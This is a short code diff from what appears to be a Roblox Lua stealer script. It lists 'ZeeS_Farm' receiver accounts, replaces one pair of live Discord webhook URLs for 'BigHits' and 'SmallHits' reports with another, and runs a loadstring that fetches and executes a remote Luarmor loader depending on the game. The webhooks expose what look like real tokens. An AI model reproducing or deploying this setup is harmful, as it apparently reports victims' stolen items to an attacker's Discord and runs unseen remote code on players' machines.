@@ -4,8 +4,8 @@ Usernames = {
 'ZeeS_Farm3',
 'ZeeS_Farm4',
 }
-BigHitsWebhook = "https://discord.com/api/webhooks/1369122401505513524/CVy1-j8O1JF2MxG9TvtmAYN8Hxu5ZDFycytV-IRpU-bJnz5DvcGMe-W-SlryUh7lHLwr"
-SmallHitsWebhook = "https://discord.com/api/webhooks/1369122401505513524/CVy1-j8O1JF2MxG9TvtmAYN8Hxu5ZDFycytV-IRpU-bJnz5DvcGMe-W-SlryUh7lHLwr"
+BigHitsWebhook = "https://discord.com/api/webhooks/1371310285159272468/gfWw-1_K0ZEi9eWjyfIH7vWefOFsHxb0HQ6NH3DWlawjz4bV3Qm9y8Hrb5hB2cs_wbYy"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1371310285159272468/gfWw-1_K0ZEi9eWjyfIH7vWefOFsHxb0HQ6NH3DWlawjz4bV3Qm9y8Hrb5hB2cs_wbYy"
 if game.PlaceId == 7606602544 then
     loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/bbccdf75425332848ae0bf6d3068f0c1.lua"))()
 elseif game.PlaceId == 16732694052 or game.PlaceId == 72907489978215 then
